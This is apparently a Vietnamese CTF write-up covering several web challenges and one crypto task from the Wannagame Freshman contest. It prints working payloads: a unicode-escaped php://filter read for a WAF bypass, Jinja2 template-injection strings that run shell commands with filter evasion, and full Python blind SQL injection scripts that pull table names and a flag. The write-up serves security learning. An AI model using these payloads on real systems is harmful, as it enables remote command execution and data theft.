---
title: "Wannagame Freshman CTF writeup"
date: 2023-11-12 00:00:00 +0800
categories: [CTF Writeup]
tags: [SQL Injectiom,SSTI]
---

# WannaWinFreshman-Writeup
## Bài 1 Warmup PHP:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5a3ee0ab-9970-4e3d-bf8f-a67604534fde)


- Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là **page** và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server
- Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viết[LINK](https://trustfoundry.net/2018/12/20/bypassing-wafs-with-json-unicode-escape-sequences/)
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/31c3d8aa-a577-4c52-b174-7eaa8910b281)

- Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ 
`php://filter/convert.base64-encode/resource=/flag`
thành
`\u0070hp://filter/convert.base64-encode/resource=/flag`
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/167c4651-6880-45a5-a3d8-ac155cf0de8a)

- Decode base64 và ra flag
- Flag: **W1{w3lc0m3_w3b_w4rrj0rs}**
## Bài 2 Namename:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/bd2e0d52-af7e-45c1-89c4-fe9600ddf55a)

- Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là `/wannaw1n`
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/c3c2e80c-42fd-4289-8161-e206cbe83114)

- Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2
- Payload : {% raw %}`{{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}` {% endraw %}
- Và nó bị chặn ![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/86841683-477b-4202-bd17-47c676c174f0)

- {% raw %} Sau vài thử nghiệm thì có vẽ nó chặn dấu `.` và `[]` nên mình chuyển qua |attr {% endraw %}

- Payload mới: {% raw %}`{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}`{% endraw %}
- Và nó đã hoạt động

![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/52518bdf-e514-4c32-82fa-6786ff0696e1)

- Bây giờ sửa lại payload từ `ls` sang `cat flag.txt`
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/e1b25b5d-a751-451c-aee2-9cff0ec4d02f)

- Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu `.` và chữ `f` thì phải)
- {% raw %}`{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}`{% endraw %}
- Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag

![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/f5dbbef9-30f7-4d40-abfd-bc1702b2ff88)

- Flag: **W1{U_are_master_in_SSTI}**
## Bài 3 Solite:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/1b569475-6ce3-4a81-8a8c-ca37628b8e39)

- Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được
- Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox)

![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/138c6617-f120-42e6-bd3d-d0d908d661e7)

- Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection
- Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/8511cff7-b6c5-4094-862d-d109b62eef8f)

- Đây là query của bài
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2d617e44-62ac-43b9-9e24-7b9b73252799)

- Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng
- `Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--`
- Tóm tắt :
- Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau `SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'`
- `select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'` sẽ trả về tên của tất cả các bảng
- `substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1)` sẽ lấy 1 ký tự a bắt đầu từ vị trí i 
- `1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--` cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là `SELECT * FROM API WHERE id LIKE '%1'` và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả
- Đây là script mình tìm tên của bảng


```py
import string,requests
from urllib.parse import quote

all_characters = string.ascii_letters + string.digits + "!#$%&()+,-/:<=>?@[]^_{}"
url = "http://45.122.249.68:20020/search?name[]="
payload="1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--"
table_name = ""
haha = 0
for i in range(1,10000):
    for ps in all_characters:
        payload ="1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%%'),%d,1) is '%c'--" %(i,ps)
        payload =  quote(payload)
        urlx = url + payload
        #print(urlx)
        r=requests.get(url=urlx)
        if "id" in r.text:
            table_name += ps
            print("Table names: ",table_name)
            haha +=1
    if haha < i:
        break
print("Success all the names of the tables are:",table_name)
```
- Và tìm ra được tên của các bảng là
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/418d91e8-49ba-4f20-bde8-d7adc602926a)


`Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0`
- Bây giờ dựa vào cái trên lấy ra flag từ bảng `flag_c1abd148_acae_40be_a953_eae333f90da0` thôi
- Script của mình

```py
import string,requests
from urllib.parse import quote

all_characters = string.ascii_letters + string.digits + "!#$%&()+,-/:<=>?@[]^_{}"
url = "http://45.122.249.68:20020/search?name[]="

table_name = "flag_c1abd148_acae_40be_a953_eae333f90da0"
#payload = "1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--"
haha = 0
flag =""
for i in range(1,10000):
    for ps in all_characters:
        payload ="1' and substr((select flag from %s),%d,1) is '%c'--" %(table_name,i,ps)
        payload =  quote(payload)
        urlx = url + payload
        #print(urlx)
        r=requests.get(url=urlx)
        if "id" in r.text:
            flag += ps
            print("Flag is: ",flag)
            haha +=1
    if haha < i:
        break
print("Here is your flag:",flag)
```

- Flag: **W1{I_th1nk_u_r_so_lite^_^}**
## Bài 4 Differences:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a7582df9-e22c-4883-8b36-1c471028aeeb)

- Flag ngay ở trong file
- Flag: **W1{SaKur4_s0_b34uTiFuL_RI9ht?????}**
## Bài 5 Free Flag:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/4bab7039-5cde-4132-bcd6-5b2a4ddb73e1)


- Đọc file pcapng ta tìm được source và key


```py
import base64

BANNER = """ ___       __   ________  ________   ________   ________  ___       __     _____  ________      
|\  \     |\  \|\   __  \|\   ___  \|\   ___  \|\   __  \|\  \     |\  \  / __  \|\   ___  \    
\ \  \    \ \  \ \  \|\  \ \  \\\ \  \ \  \\\ \  \ \  \|\  \ \  \    \ \  \|\/_|\  \ \  \\\ \  \   
 \ \  \  __\ \  \ \   __  \ \  \\\ \  \ \  \\\ \  \ \   __  \ \  \  __\ \  \|/ \ \  \ \  \\\ \  \  
  \ \  \|\__\_\  \ \  \ \  \ \  \\\ \  \ \  \\\ \  \ \  \ \  \ \  \|\__\_\  \   \ \  \ \  \\\ \  \ 
   \ \____________\ \__\ \__\ \__\\\ \__\ \__\\\ \__\ \__\ \__\ \____________\   \ \__\ \__\\\ \__\\
    \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________|    \|__|\|__| \|__|
"""

KEY = bytes.fromhex('deadbeef')

def encryptSecret(secret):
    lst_byte = []
    for i in range(len(secret)):
        enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)]
        lst_byte.append(enc_byte.to_bytes(1, 'big'))
    
    return base64.b64encode(b''.join([_ for _ in lst_byte])).decode()

if __name__=='__main__':
    print(BANNER)
    secret = input("> Please give me your secret: ")
    print("\n> Here is your encrypted secret:", encryptSecret(secret)
```

![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a9b96523-9039-4b3c-abbb-4d87c0147612)

- Decrypt lại ta sẽ có flag


```py
import base64

KEY = bytes.fromhex('deadbeef')

def decryptSecret(encrypted_secret):
    encrypted_bytes = base64.b64decode(encrypted_secret.encode())
    decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))]
    decrypted_text = ''.join([chr(byte) for byte in decrypted_bytes])
    return decrypted_text

secret = "iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA="

print(decryptSecret(secret))
```

- Flag: **W1{_w3llC0mE_tO_w4nNaw1N_}**
- ~~**Mấy bài còn lại mình chưa biết làm do dark quá**~~


